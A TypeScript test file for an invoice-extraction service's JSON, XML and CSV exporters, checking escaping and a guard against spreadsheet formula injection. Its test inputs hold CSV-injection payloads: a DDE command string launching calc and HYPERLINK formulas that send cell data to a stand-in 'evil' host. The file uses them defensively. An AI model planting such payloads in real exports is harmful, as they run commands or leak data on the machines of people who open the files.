import assert from "node:assert/strict";
import { test } from "node:test";
import { csvCell, serialize, toCsv, toJson, toXml } from "../src/services/formats.ts";
import type { DocumentRecord } from "../src/types.ts";

function sample(): DocumentRecord {
  return {
    id: "abc123",
    resourceId: "abc123",
    status: "ready",
    bytes: 2048,
    createdAt: "2026-09-12T00:00:00.000Z",
    updatedAt: "2026-09-12T00:00:05.000Z",
    filename: "invoice.pdf",
    contentType: "application/pdf",
    docType: "invoice",
    docTypeConfidence: 0.97,
    fields: [
      { key: "vendor_name", label: "Vendor", value: "Acme Robotics <Pty> & Co", confidence: 0.95 },
      { key: "total", label: "Total", value: 105600, confidence: 0.95 },
      {
        key: "line_items",
        label: "Line Items",
        value: ["Printer x2 @ $48,000", 'Cable "premium"'],
        confidence: 0.85,
      },
    ],
    evidence: [
      { field: "vendor_name", quote: "ACME ROBOTICS <Pty> & Co", verified: "exact", start: 0, end: 24 },
      { field: "total", quote: "TOTAL DUE: $105,600", verified: "normalised", paragraphId: "r/f/file/0-19" },
    ],
    entities: [{ text: "Acme Robotics", type: "ORG" }],
    summary: "An invoice from Acme.",
    tags: ["invoice", "hardware"],
    issues: [{ field: "tax", severity: "warning", message: "subtotal + tax ≠ total" }],
    meta: {
      processedAt: "2026-06-30T00:00:00.000Z",
      schema: "invoice_extraction",
      model: "chatgpt-azure-4o",
      durationsMs: {},
    },
  };
}

test("toJson round-trips to the same object", () => {
  const rec = sample();
  const parsed = JSON.parse(toJson(rec));
  assert.deepEqual(parsed, rec);
});

test("toXml escapes special characters and is well-formed-ish", () => {
  const xml = toXml(sample());
  assert.match(xml, /^<\?xml version="1.0" encoding="UTF-8"\?>/);
  assert.match(xml, /<document id="abc123" type="invoice">/);
  // angle brackets and ampersand escaped
  assert.match(xml, /Acme Robotics &lt;Pty&gt; &amp; Co/);
  assert.ok(!/<Pty>/.test(xml), "raw <Pty> must not appear unescaped");
  // array becomes <item> children
  assert.match(xml, /<item>Printer x2 @ \$48,000<\/item>/);
  // balanced root tag
  assert.match(xml, /<\/document>$/);
});

test("toCsv emits one row per field with a header and quotes risky cells", () => {
  const csv = toCsv(sample());
  const lines = csv.split("\n");
  assert.equal(
    lines[0],
    "document_id,filename,doc_type,field_key,field_label,value,confidence,evidence_quote,evidence_verified",
  );
  assert.equal(lines.length, 1 + 3); // header + 3 fields
  // comma-containing array value must be quoted
  const itemsRow = lines.find((l) => l.startsWith("abc123,invoice.pdf,invoice,line_items"))!;
  assert.match(itemsRow, /"Printer x2 @ \$48,000; Cable ""premium"""/);
});

test("serialize dispatches by format", () => {
  const rec = sample();
  assert.equal(serialize(rec, "json"), toJson(rec));
  assert.equal(serialize(rec, "xml"), toXml(rec));
  assert.equal(serialize(rec, "csv"), toCsv(rec));
});

test("csvCell neutralises spreadsheet formula injection but leaves numbers alone", () => {
  // Field values come from an LLM reading an attacker-supplied document, so a vendor name
  // can be anything. Excel/Sheets execute a cell that starts with = + - @ tab or CR.
  assert.equal(csvCell("=1+1"), "'=1+1");
  assert.equal(csvCell("@SUM(A1)"), "'@SUM(A1)");
  assert.equal(csvCell("+61 3 9000 1234"), "'+61 3 9000 1234");
  assert.equal(
    csvCell('=HYPERLINK("http://evil.example/?x="&A1,"click")'),
    `"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"`,
  );
  // Numbers must stay numbers so the export is still arithmetic-friendly.
  assert.equal(csvCell("-105.5"), "-105.5");
  assert.equal(csvCell("105600"), "105600");
  assert.equal(csvCell("ACME ROBOTICS"), "ACME ROBOTICS");
});

test("toCsv escapes a malicious extracted value and a malicious quote", () => {
  const rec = sample();
  rec.fields = [{ key: "vendor_name", label: "Vendor", value: "=cmd|'/c calc'!A1", confidence: 0.9 }];
  rec.evidence = [];
  const row = toCsv(rec).split("\n")[1]!;
  // No comma/quote/newline in the value, so no RFC 4180 quoting — just the formula guard.
  assert.ok(row.endsWith("Vendor,'=cmd|'/c calc'!A1,0.90,,"), row);

  // The evidence quote is attacker-controlled document text too, so it gets the same guard.
  rec.evidence = [{ field: "vendor_name", quote: '=HYPERLINK("http://evil")', verified: "exact" }];
  const withQuote = toCsv(rec).split("\n")[1]!;
  assert.ok(withQuote.includes(`"'=HYPERLINK(""http://evil"")"`), withQuote);
});

test("toXml includes verified evidence and the grounding score", () => {
  const rec = sample();
  rec.meta.groundingScore = 0.67;
  const xml = toXml(rec);
  assert.match(xml, /<evidence>/);
  assert.match(xml, /verified="exact"/);
  assert.match(xml, /paragraphId="r\/f\/file\/0-19"/);
  // The quote's own angle brackets must be escaped, not emitted raw.
  assert.match(xml, /ACME ROBOTICS &lt;Pty&gt; &amp; Co<\/quote>/);
  assert.match(xml, /<groundingScore>0.67<\/groundingScore>/);
});

test("toCsv carries each field's quote and verification alongside its value", () => {
  const rows = toCsv(sample()).split("\n");
  assert.match(rows[0]!, /evidence_quote,evidence_verified$/);
  const vendor = rows.find((r) => r.includes("vendor_name"))!;
  assert.ok(vendor.endsWith("ACME ROBOTICS <Pty> & Co,exact"), vendor);
  // A field with no evidence still produces a well-formed row with empty columns.
  const lineItems = rows.find((r) => r.includes("line_items"))!;
  assert.ok(lineItems.endsWith(",,"), lineItems);
});
